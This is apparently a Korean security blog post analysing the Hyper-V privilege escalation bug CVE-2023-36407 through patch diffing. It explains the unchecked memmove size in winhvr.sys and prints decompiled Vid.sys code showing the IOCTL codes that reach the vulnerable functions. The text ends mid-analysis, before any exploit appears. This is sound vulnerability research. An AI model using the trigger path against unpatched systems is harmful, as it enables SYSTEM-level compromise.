  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2024-05-12 19:00" pubdate>
      2024 5 12 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      59
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] NewJeans Hyper-V Part 7 - CVE-2023-36407 Analysis &amp; Exploitation</h1>
            
            <div class="markdown-body" id="post-body">
              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              <!-- hackyboiz_horizen_index -->
              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3672652207808168" data-ad-slot="8887862313" data-ad-format="auto" data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              <p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xBB34;&#xB824; Part 7&#xB85C; &#xB3CC;&#xC544;&#xC628; pwndorei&#xC785;&#xB2C8;&#xB2E4;!</p>
<p>&#xC9C0;&#xB09C; Part 6&#xC5D0;&#xC11C;&#xB294; Hyper-V &#xD328;&#xCE58; &#xC790;&#xB3D9;&#xD654; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC778; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/pwndorei/Patch-V">Patch-V</a>&#xB97C; &#xC18C;&#xAC1C;&#xD558;&#xACE0; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC2DC;&#xB85C; &#xC0AC;&#xC6A9;&#xBC29;&#xBC95;&#xC744; &#xC54C;&#xB824;&#xB4DC;&#xB838;&#xC5C8;&#xC8E0;? &#xC774;&#xBC88;&#xC5D0;&#xB294; Patch-V&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; Hyper-V LPE &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2023-36407&#xC744; Patch Diffiing&#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p>
<h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><hr>
<p>Part 6&#xC5D0;&#xC11C; CVE-2024-20699&#xC640; CVE-2024-20700&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; KB5034121&#xC640; KB5033369&#xB97C; Diffing&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xC774;&#xBC88;&#xC5D0;&#xB294; KB5031354&#xACFC; KB5032190&#xC744; Diffing&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>Windows 11 22H2(x64)&#xAE30;&#xC900; KB5032190&#xB85C; &#xD328;&#xCE58;&#xB41C; Hyper-V &#xCDE8;&#xC57D;&#xC810;&#xC740; Information Disclosure &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2023-36406&#xACFC; Elevation of Privilege &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2023-36407, CVE-2023-36408&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>Patch-V&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC5BB;&#xC5B4;&#xC9C4; &#xAC01; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB4E4;&#xC744; &#xB514;&#xD551;&#xD55C; BinDiff &#xC6CC;&#xD06C;&#xC2A4;&#xD398;&#xC774;&#xC2A4;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image0.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image0.png"></p>
<p>&#xBCC0;&#xACBD;&#xC810;&#xC774; &#xAF64;&#xB098; &#xB9CE;&#xC744; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;? &#xAC01; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBCC4;&#xB85C; &#xBC14;&#xB010; &#xC810;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xADF8;&#xB9AC;&#xACE0; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC14;&#xB00C;&#xC5C8;&#xB294;&#xC9C0; &#xC804;&#xBD80; &#xC0B4;&#xD3B4;&#xBCF4;&#xB294; &#xAC83;&#xB3C4; &#xBB34;&#xB9AC;&#xB294; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC; &#xC2DC;&#xAC04;&#xC774; &#xB108;&#xBB34; &#xC624;&#xB798; &#xAC78;&#xB9B4; &#xAC81;&#xB2C8;&#xB2E4;&#x2026;</p>
<p>&#xB530;&#xB77C;&#xC11C; &#xC800;&#xB294; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xCD5C;&#xB300;&#xD55C; &#xD65C;&#xC6A9;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB4E4; &#xBA3C;&#xC800; &#xC0B4;&#xD3B4;&#xBCF4;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p>&#xBA3C;&#xC800; CVE-2023-36407&#xACFC; CVE-2023-36408 &#xBAA8;&#xB450; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xAE30;&#xC5D0; &#xBA3C;&#xC800; <code>.sys</code> &#xD30C;&#xC77C;&#xB4E4;&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC8E0;? &#xD2B9;&#xD788; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36407">MSRC</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; FAQ&#xB97C; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC801;&#xD600;&#xC788;&#xB294;&#xB370;&#xC694;?</p>
<pre><code class="hljs http"><span class="hljs-attribute">Q</span>: What privileges could be gained by an attacker who successfully exploited this vulnerability?

<span class="hljs-attribute">A</span>: An attacker who successfully exploited this vulnerability could gain SYSTEM privileges.</code></pre>
<p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xBA74; <code>SYSTEM</code> &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB77C;&#x2026; Root Partition&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB4E4;&#xC744; &#xC704;&#xC8FC;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xB420; &#xAC83; &#xAC19;&#xB124;&#xC694;!</p>
<h1 id="Diffing"><a href="#Diffing" class="headerlink" title="Diffing"></a>Diffing</h1><hr>
<p><code>.sys</code>&#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC9D1;&#xC911;&#xC801;&#xC73C;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF8; &#xACB0;&#xACFC;, <code>winhvr.sys</code>&#xC758; <code>WinHvGetVpState</code> &#xD568;&#xC218;&#xC640; <code>WinHvSetVpState</code> &#xD568;&#xC218;&#xAC00; &#xD06C;&#xAC8C; &#xBC14;&#xB00C;&#xC5C8;&#xACE0; <code>WinHvpSetupVpStatePfnBuffer</code> &#xD568;&#xC218;&#xAC00; &#xC0AD;&#xC81C;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image1.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image1.png"></p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image2.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image2.png"></p>
<p>&#xC544;&#xB798;&#xB97C; &#xBCF4;&#xC2DC;&#xBA74; &#xD328;&#xCE58; &#xC774;&#xD6C4;&#xB85C; &#xC5EC;&#xB7EC; Basic Block&#xC774; &#xCD94;&#xAC00;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xC5B4;&#xB5A4; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC544; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xACE0; &#xD328;&#xCE58;&#xB294; &#xD574;&#xB2F9; &#xAC12;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xAC78;&#xAE4C;&#xC694;?&#x2026;</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image3.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image3.png"></p>
<p>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBE44;&#xAD50;&#xD55C; &#xACB0;&#xACFC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image4.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image4.png"></p>
<p>&#xD328;&#xCE58;&#xB418;&#xBA74;&#xC11C; &#xC0AD;&#xC81C;&#xB41C; <code>WinHvpSetupVpStatePfnBuffer</code> &#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C;(&#xC67C;&#xCABD;, Line 30)&#xC774; &#xC0AC;&#xB77C;&#xC9C0;&#xACE0; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xB2E4;&#xB978; &#xCF54;&#xB4DC;&#xAC00; &#xB300;&#xCCB4;&#xD55C; &#xAC83;&#xACFC; <code>memmove</code>&#xC758; &#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; &#xBCF5;&#xC0AC;&#xD560; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774; + 0x28&#xC774; 0x1000&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC774; &#xCD94;&#xAC00;(&#xC624;&#xB978;&#xCABD;, Line 39)&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;!</p>
<p><code>WinHvGetVpState</code> &#xB610;&#xD55C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB3D9;&#xC77C;&#xD55C; &#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image5.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image5.png"></p>
<p>&#xADF8;&#xB9AC;&#xACE0; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC0AD;&#xC81C;&#xB41C; <code>WinHvpSetupVpStatePfnBuffer</code>&#xD568;&#xC218;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740;&#xB370;&#xC694;?</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image6.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image6.png"></p>
<p><code>ExAllocatePool2</code>&#xC640; <code>MmGetPhysicalAddress</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB2E4;&#xB978; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xC544; &#xC774; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC0AD;&#xC81C;&#xB418;&#xACE0; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC;&#xC640; &#xC644;&#xC804; &#xB3D9;&#xC77C;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xB429;&#xB2C8;&#xB2E4;! &#xC544;&#xB9C8; &#xB2E4;&#xB978; &#xACF3;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xC9C0;&#xB3C4; &#xC54A;&#xACE0; &#xD568;&#xC218;&#xB85C;&#xC11C;&#xC758; &#xC758;&#xBBF8;&#xAC00; &#xD1F4;&#xC0C9;&#xB418;&#xC5B4; &#xC0AC;&#xB77C;&#xC9C4;&#xAC8C; &#xC544;&#xB2D0;&#xAE4C; &#xC870;&#xC2EC;&#xC2A4;&#xB808; &#xCD94;&#xCE21;&#xD574;&#xBD05;&#xB2C8;&#xB2E4;&#x2026;</p>
<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><hr>
<p>&#xC815;&#xB9AC;&#xD558;&#xC790;&#xBA74; CVE-2023-36407&#xC740; <code>winhvr.sys</code>&#xC758; <code>WinHvGetVpState</code>&#xC640; <code>WinHvSetVpState</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>memove</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>Size</code> &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD558;&#xB294; OOB Read/Write &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;! <code>WinHvGetVpState</code>&#xB85C; OOB Read&#xB97C; <code>WinHvSetVpState</code>&#xB85C; OOB Write&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xACE0; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xD37C;&#xB294; <code>&quot;WHvJ&quot;</code> &#xD0DC;&#xADF8;&#xB85C; &#xD560;&#xB2F9;&#xB41C; 0x1000 &#xD06C;&#xAE30;&#xC758; Non-paged Pool&#xB85C; Hypercall&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBC84;&#xD37C;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xAC00;&#xC0C1; &#xD504;&#xB85C;&#xC138;&#xC11C;(Virtual Processor)&#xC758; &#xC0C1;&#xD0DC;(State)&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p>
<h1 id="Triggering-the-Bug"><a href="#Triggering-the-Bug" class="headerlink" title="Triggering the Bug"></a>Triggering the Bug</h1><p>&#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA3C;&#xC800; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC54C; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC740; <code>winhvr.sys</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xACE0; Export&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0; Virtualization Infrastructure Driver(<code>Vid.sys</code>)&#xC5D0;&#xC11C; Import&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h2 id="Vid-VidExoIoControlPartition"><a href="#Vid-VidExoIoControlPartition" class="headerlink" title="Vid!VidExoIoControlPartition"></a>Vid!VidExoIoControlPartition</h2><p><code>Vid.sys</code>&#xC5D0;&#xC11C; <code>WinHvGetVpState</code>&#xC640; <code>WinHvSetVpState</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD568;&#xC218;&#xB85C; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; I/O Control&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>VidExoIoControlPartition</code>&#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c">ulonglong VidExoIoControlPartition
                    (undefined (*param_1) [<span class="hljs-number">16</span>],_IRP *param_2,ulonglong *FileObject,<span class="hljs-keyword">void</span> *InputBuffer
                    ,uint InputBufferLength,<span class="hljs-keyword">void</span> *OutputBuffer,uint OutputBufferLength,
                    uint ControlCode,uint *param_9)

{
  <span class="hljs-keyword">int</span> iVar1;
  ulonglong uVar2;
  undefined4 extraout_var;
  undefined4 extraout_var_00;
  
  *param_9 = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">if</span> (ControlCode == <span class="hljs-number">0x221278</span>) {
    <span class="hljs-keyword">if</span> (InputBufferLength &lt; <span class="hljs-number">0x18</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-number">0xc0000023</span>;
    }
                    <span class="hljs-comment">/* WARNING: Load size is inaccurate */</span>
    uVar2 = WinHvInstallIntercept
                      (*(undefined8 *)(param_1[<span class="hljs-number">0x28</span>] + <span class="hljs-number">8</span>),*InputBuffer,(longlong)InputBuffer + <span class="hljs-number">8</span>);
    <span class="hljs-keyword">return</span> uVar2;
  }
  <span class="hljs-keyword">if</span> (<span class="hljs-number">0x221198</span> &lt; ControlCode) {
    <span class="hljs-keyword">switch</span>(ControlCode) {
	<span class="hljs-string">&apos;&apos;&apos;</span>
    <span class="hljs-keyword">case</span> <span class="hljs-number">0x221264</span>:
      <span class="hljs-keyword">if</span> (InputBufferLength &lt; <span class="hljs-number">0x20</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0xc0000023</span>;
      }
      <span class="hljs-keyword">if</span> (OutputBufferLength == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0xc0000023</span>;
      }
      <span class="hljs-keyword">if</span> (<span class="hljs-number">0x1fb000</span> &lt; OutputBufferLength) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000005</span>;
      }
                    <span class="hljs-comment">/* WARNING: Load size is inaccurate */</span>
      uVar2 = WinHvGetVpState(*(undefined8 *)(param_1[<span class="hljs-number">0x28</span>] + <span class="hljs-number">8</span>),*InputBuffer,
                              *(undefined *)((longlong)InputBuffer + <span class="hljs-number">4</span>),(longlong)InputBuffer + <span class="hljs-number">8</span>,
                              OutputBuffer,OutputBufferLength);
      <span class="hljs-keyword">if</span> (<span class="hljs-number">-1</span> &lt; (<span class="hljs-keyword">int</span>)uVar2) {
        *param_9 = OutputBufferLength;
        <span class="hljs-keyword">return</span> uVar2;
      }
      <span class="hljs-keyword">return</span> uVar2;
    <span class="hljs-keyword">case</span> <span class="hljs-number">0x221268</span>:
      <span class="hljs-keyword">if</span> (InputBufferLength &lt; <span class="hljs-number">0x21</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0xc0000023</span>;
      }
      <span class="hljs-keyword">if</span> (<span class="hljs-number">0x1fb000</span> &lt; InputBufferLength - <span class="hljs-number">0x20</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000005</span>;
      }
                    <span class="hljs-comment">/* WARNING: Load size is inaccurate */</span>
      uVar2 = WinHvSetVpState(*(undefined8 *)(param_1[<span class="hljs-number">0x28</span>] + <span class="hljs-number">8</span>),*InputBuffer,
                              *(undefined *)((longlong)InputBuffer + <span class="hljs-number">4</span>),(longlong)InputBuffer + <span class="hljs-number">8</span>,
                              (longlong)InputBuffer + <span class="hljs-number">0x20</span>,InputBufferLength - <span class="hljs-number">0x20</span>);
      <span class="hljs-keyword">return</span> uVar2;
	  ...
	}
  }
  <span class="hljs-keyword">return</span> uVar2;
}
</code></pre>
<p>control code&#xAC00; &#xAC01;&#xAC01; 0x221264, 0x221268&#xC77C; &#xB54C; <code>WinHvGetVpState</code>, <code>WinHvSetVpState</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC544;&#xB798;&#xC758; <code>\Device\VidExo</code> &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; I/O Control&#xC740; <code>VidExopIoControlPreProcess</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xB85C; &#xC774;&#xC5B4;&#xC838; <code>VidExoIoControlDriver</code>, <code>VidExoIoControlPartition</code>, <code>VidIoControlDriver</code>, <code>VidIoControlPartition</code> &#xD568;&#xC218; &#xC911; &#xD558;&#xB098;&#xAC00; &#xD638;&#xCD9C;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image7.png" srcset="/img/loading.gif" alt="newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image7.png"></p>
<h3 id="VidExopIoControlPreProcess"><a href="#VidExopIoControlPreProcess" class="headerlink" title="VidExopIoControlPreProcess"></a><code>VidExopIoControlPreProcess</code></h3><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VidExopIoControlPreProcess</span><span class="hljs-params">(__int64 a1, IRP *irp)</span></span>
<span class="hljs-function"></span>{
  a8[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;
  CurStackLocation = irp-&gt;Tail.Overlay.CurrentStackLocation;
  CTL_CODE = CurStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;
  <span class="hljs-keyword">if</span> ( (CTL_CODE &amp; <span class="hljs-number">3</span>) == <span class="hljs-number">0</span> )
  {
    InputLength = CurStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;
    <span class="hljs-keyword">if</span> ( InputLength )
      InputBuffer = irp-&gt;AssociatedIrp.SystemBuffer;
    <span class="hljs-keyword">else</span>
      InputBuffer = <span class="hljs-number">0</span>i64;
    OutputLength = CurStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;
    <span class="hljs-keyword">if</span> ( OutputLength )
      OutputBuffer = irp-&gt;AssociatedIrp.SystemBuffer;
    <span class="hljs-keyword">else</span>
      OutputBuffer = <span class="hljs-number">0</span>i64;
    FileObj = CurStackLocation-&gt;FileObject;
    v11 = (<span class="hljs-keyword">unsigned</span> __int64)FileObj-&gt;FsContext;
    fscontext = v11 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>ui64;<span class="hljs-comment">// *(DWORD*)fscontext == &apos; oxE&apos;</span>
    <span class="hljs-keyword">if</span> ( fscontext )
    {
      if ( *(_DWORD *)fscontext != &apos; oxE&apos; )
      {
        if ( *(_DWORD *)fscontext != &apos;ntrP&apos; )
        {
          v5 = <span class="hljs-number">-1073741816</span>;
          <span class="hljs-keyword">goto</span> LABEL_3;
        }
        ...
        <span class="hljs-keyword">if</span> ( _bittest64(&amp;v16, <span class="hljs-number">0xF</span>u) )
          v17 = VidExoIoControlPartition((_QWORD *)fscontext,irp,FileObj,InputBuffer,InputLength,OutputBuffer,OutputLength,CTL_CODE,(__int64)a8);
        <span class="hljs-keyword">else</span>
          ...
      }
